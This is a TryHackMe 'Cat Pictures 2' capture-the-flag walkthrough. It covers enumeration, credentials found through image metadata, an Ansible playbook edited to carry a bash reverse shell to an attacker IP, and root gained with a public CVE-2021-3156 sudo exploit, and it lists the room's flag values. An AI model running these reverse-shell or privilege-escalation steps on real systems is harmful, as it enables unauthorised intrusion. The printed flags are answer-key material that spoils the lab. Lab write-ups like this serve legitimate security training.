## Cat Pictures 2 - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/catpictures2)

**IP: 10.10.226.74**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Gobuster.

  ```
  nmap -sC -sV 10.10.226.74

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
  |   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
  |_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
  80/tcp   open  http    nginx 1.4.6 (Ubuntu)
  | http-git: 
  |   10.10.226.74:80/.git/
  |     Git repository found!
  |     Repository description: Unnamed repository; edit this file 'description' to name the...
  |     Remotes:
  |       https://github.com/electerious/Lychee.git
  |_    Project type: PHP application (guessed from .gitignore)
  |_http-server-header: nginx/1.4.6 (Ubuntu)
  |_http-title: Lychee
  | http-robots.txt: 7 disallowed entries 
  |_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
  222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
  | ssh-hostkey: 
  |   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
  |_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
  3000/tcp open  http    Golang net/http server
  | fingerprint-strings: 
  |   GenericLines, Help, RTSPRequest: 
  |     HTTP/1.1 400 Bad Request
  |     Content-Type: text/plain; charset=utf-8
  |     Connection: close
  |     Request
  |   GetRequest: 
  |     HTTP/1.0 200 OK
  |     Cache-Control: no-store, no-transform
  |     Content-Type: text/html; charset=UTF-8
  |     Set-Cookie: i_like_gitea=21bfc6e344800109; Path=/; HttpOnly; SameSite=Lax
  |     Set-Cookie: _csrf=eZnGo5PXLqKKLI8PVyGMDXS4S_A6MTc0ODk3MzQ3NjUzOTYyMjg1Ng; Path=/; Expires=Wed, 04 Jun 2025 17:57:56 GMT; HttpOnly; SameSite=Lax
  |     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
  |     X-Frame-Options: SAMEORIGIN
  |     Date: Tue, 03 Jun 2025 17:57:56 GMT
  |     <!DOCTYPE html>
  |     <html lang="en-US" class="theme-">
  |     <head>
  |     <meta charset="utf-8">
  |     <meta name="viewport" content="width=device-width, initial-scale=1">
  |     <title> Gitea: Git with a cup of tea</title>
  |     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
  |   HTTPOptions: 
  |     HTTP/1.0 405 Method Not Allowed
  |     Cache-Control: no-store, no-transform
  |     Set-Cookie: i_like_gitea=4c88dd0f0b1a7eda; Path=/; HttpOnly; SameSite=Lax
  |     Set-Cookie: _csrf=76J1IkkHn2wiD56I7ZHUmAMoMZA6MTc0ODk3MzQ3Njg0NjIyMzUyMA; Path=/; Expires=Wed, 04 Jun 2025 17:57:56 GMT; HttpOnly; SameSite=Lax
  |     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
  |     X-Frame-Options: SAMEORIGIN
  |     Date: Tue, 03 Jun 2025 17:57:56 GMT
  |_    Content-Length: 0
  |_http-title:  Gitea: Git with a cup of tea
  8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
  |_http-title: Welcome to nginx!
  |_http-server-header: SimpleHTTP/0.6 Python/3.6.9
  ```

  ```
  gobuster dir -u http://10.10.226.74/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.git/HEAD            (Status: 200) [Size: 23]
  /.htaccess            (Status: 200) [Size: 630]
  /data                 (Status: 301) [Size: 193] [--> http://10.10.226.74/data/]
  /dist                 (Status: 301) [Size: 193] [--> http://10.10.226.74/dist/]
  /docs                 (Status: 301) [Size: 193] [--> http://10.10.226.74/docs/]
  /favicon.ico          (Status: 200) [Size: 33412]
  /index.html           (Status: 200) [Size: 60906]
  /LICENSE              (Status: 200) [Size: 1105]
  /php                  (Status: 301) [Size: 193] [--> http://10.10.226.74/php/]
  /plugins              (Status: 301) [Size: 193] [--> http://10.10.226.74/plugins/]
  /robots.txt           (Status: 200) [Size: 136]
  /src                  (Status: 301) [Size: 193] [--> http://10.10.226.74/src/]
  /uploads              (Status: 301) [Size: 193] [--> http://10.10.226.74/uploads/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you check the first cat picture you can find note about metadata. Download the picture and put it in exiftools.

  ```Title	:8080/764efa883dda1e11db47671c4a3bbd9e.txt```
  
- After visiting newly found message, you can find the credentials for port 3000 and info about port 1337.

  ```
  note to self:

  I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
  This file isn't easy to find anyway unless you have the correct url...
  
  gitea: port 3000
  user: samarium
  password: TUmhyZ37CLZrhP
  
  ansible runner (olivetin): port 1337
  ```

- You can find the first flag in Github repo.

  ```
  http://10.10.226.74:3000/samarium/ansible/src/branch/main/flag1.txt

  10d916eaea54bb5ebe36b59538146bb5
  ```

- There's also a script that we will use in a bit.

  ```
  playbook.yaml

  ---
  - name: Test 
    hosts: all                                  # Define all the hosts
    remote_user: bismuth                                  
    # Defining the Ansible task
    tasks:             
      - name: get the username running the deploy
        become: false
        command: whoami
        register: username_on_the_host
        changed_when: false
  
      - debug: var=username_on_the_host
  
      - name: Test
        shell: echo hi
  ```

---

## ⚙️ Shell Access

- I switched to port 1337 to check it out and found few options to run different scripts. The `Run Ansible Playbook` option is what we need since it will trigger the script above.

  ```
  Updating 0e5c327..90a2cfb
  Fast-forward
   shell.php | 192 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   1 file changed, 192 insertions(+)
   create mode 100644 shell.php
  
  PLAY [Test] ********************************************************************
  
  TASK [Gathering Facts] *********************************************************
  ok: [127.0.0.1]
  
  TASK [get the username running the deploy] *************************************
  ok: [127.0.0.1]
  
  TASK [debug] *******************************************************************
  ok: [127.0.0.1] => {
      "username_on_the_host": {
          "changed": false, 
          "cmd": [
              "whoami"
          ], 
          "delta": "0:00:00.003990", 
          "end": "2025-06-03 11:38:29.471434", 
          "failed": false, 
          "rc": 0, 
          "start": "2025-06-03 11:38:29.467444", 
          "stderr": "", 
          "stderr_lines": [], 
          "stdout": "bismuth", 
          "stdout_lines": [
              "bismuth"
          ]
      }
  }
  
  TASK [Test] ********************************************************************
  changed: [127.0.0.1]
  
  PLAY RECAP *********************************************************************
  127.0.0.1                  : ok=4    changed=1    unreachable=0    failed=0  
  ```
  
- Now edit the `playbook.yaml` by adding bash one-liner with reverse shell `bash -c 'exec bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'`.

  ```
  ---
  - name: Test 
    hosts: all                                  # Define all the hosts
    remote_user: bismuth                                  
    # Defining the Ansible task
    tasks:             
      - name: get the username running the deploy
        become: false
        command: bash -c 'exec bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'
        register: username_on_the_host
        changed_when: false
  
      - debug: var=username_on_the_host
  
      - name: Test
        shell: echo hi
  ```
  
- Start a listener and run Ansible Playbook option and you will get a shell.

  ```
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.226.74] 50450
  bismuth@catpictures-ii:~$ whoami
  whoami
  bismuth
  bismuth@catpictures-ii:~$ id
  id
  uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
  ```

---

## 🧍 User Privilege Escalation

- Second flag is already there, moving to root.

  ```
  bismuth@catpictures-ii:~$ ls -al
  total 56
  drwxr-xr-x 8 bismuth bismuth 4096 Mar 20  2023 .
  drwxr-xr-x 3 root    root    4096 Nov  7  2022 ..
  drwxr-xr-x 3 bismuth bismuth 4096 Nov  7  2022 .ansible
  lrwxrwxrwx 1 bismuth bismuth    9 Nov  7  2022 .bash_history -> /dev/null
  -rw-r--r-- 1 bismuth bismuth  220 Nov  7  2022 .bash_logout
  -rw-r--r-- 1 bismuth bismuth 3771 Nov  7  2022 .bashrc
  drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .cache
  drwxr-x--- 3 bismuth bismuth 4096 Nov  7  2022 .config
  -rw-rw-r-- 1 bismuth bismuth   33 Mar 20  2023 flag2.txt
  drwx------ 3 bismuth bismuth 4096 Nov  7  2022 .gnupg
  -rw------- 1 bismuth bismuth   43 Nov  7  2022 .lesshst
  drwxrwxr-x 2 bismuth bismuth 4096 Nov  7  2022 .nano
  -rw-r--r-- 1 bismuth bismuth  655 Nov  7  2022 .profile
  drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .ssh
  -rw-r--r-- 1 bismuth bismuth    0 Nov  7  2022 .sudo_as_admin_successful
  -rw-rw-r-- 1 bismuth bismuth  182 Nov  7  2022 .wget-hsts
  
  bismuth@catpictures-ii:~$ cat flag2.txt 
  5e2cafbbf180351702651c09cd797920
  ```

---

## 👑 Root Privilege Escalation

- In order to get to root, we will exploit sudo.

  ```
  bismuth@catpictures-ii:~$ sudo --version
  Sudo version 1.8.21p2
  Sudoers policy plugin version 1.8.21p2
  Sudoers file grammar version 46
  Sudoers I/O plugin version 1.8.21p2
  ```
  
- [This exploit](https://www.exploit-db.com/exploits/47502) wont work since it requires password that we don't have but [this one](https://github.com/blasty/CVE-2021-3156.git) will work.

- Exploitation is pretty simple. Clone the repo, convert it and upload it to target machine. On target machine extract the .tar file and build the exploit by following commands from GitHub.

  ```
  $ git clone https://github.com/blasty/CVE-2021-3156.git
  $ tar -cvf exploit.tar CVE-2021-3156
  $ python3 -m http.server 80

  bismuth@catpictures-ii:~$ wget http://[YOUR-THM-IP]:80/exploit.tar
  bismuth@catpictures-ii:~$ tar xopf exploit.tar
  bismuth@catpictures-ii:~$ ls
  CVE-2021-3156  exploit.tar  flag2.txt  
  
  bismuth@catpictures-ii:~$ cd CVE-2021-3156/
  bismuth@catpictures-ii:~/CVE-2021-3156$ ls
  brute.sh  hax.c  lib.c  Makefile  README.md

  bismuth@catpictures-ii:~/CVE-2021-3156$ make
  rm -rf libnss_X
  mkdir libnss_X
  gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
  gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
  ```
  
- We finished everything besides running the actual exploit so let's do it!

  ```
  bismuth@catpictures-ii:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich

  ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
  
    usage: ./sudo-hax-me-a-sandwich <target>
  
    available targets:
    ------------------------------------------------------------
      0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
      1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
      2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
    ------------------------------------------------------------
  
    manual mode:
      ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

  bismuth@catpictures-ii:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

  ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
  
  using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
  ** pray for your rootshell.. **
  [+] bl1ng bl1ng! We got it!
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
  ```

- Read the flag and that's it, bye!

---

## 🏁 Flags

- **Flag1**: `10d916eaea54bb5ebe36b59538146bb5`
- **Flag2**: `5e2cafbbf180351702651c09cd797920`
- **Flag3**: `6d2a9f8f8174e86e27d565087a28a971`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much.`

- What did I learn?
  `Just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
